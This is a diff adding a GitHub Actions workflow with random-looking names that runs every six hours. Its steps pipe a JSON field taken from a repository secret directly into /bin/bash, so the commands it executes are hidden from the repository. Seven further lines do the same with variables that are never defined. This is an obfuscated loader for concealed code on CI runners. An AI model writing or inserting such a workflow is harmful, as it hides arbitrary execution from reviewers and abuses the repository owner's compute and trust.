@@ -1,0 +1,24 @@
+name: nkchla
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nkchla
+        env:
+          g78075: ${{ secrets.g78075 }}
+        run: |
+          echo $g78075 | jq -r .wsp66 | /bin/bash
+          echo $mvgkz9384 | jq -r .in535 | /bin/bash
+          echo $iizzz622 | jq -r .ald9 | /bin/bash
+          echo $cr4 | jq -r .tsu6053 | /bin/bash
+          echo $xmamk22490 | jq -r .pbax4 | /bin/bash
+          echo $euxa8599 | jq -r .rokmc9 | /bin/bash
+          echo $ofu62 | jq -r .tbev3145 | /bin/bash
+          echo $bg6581 | jq -r .j3222 | /bin/bash
+
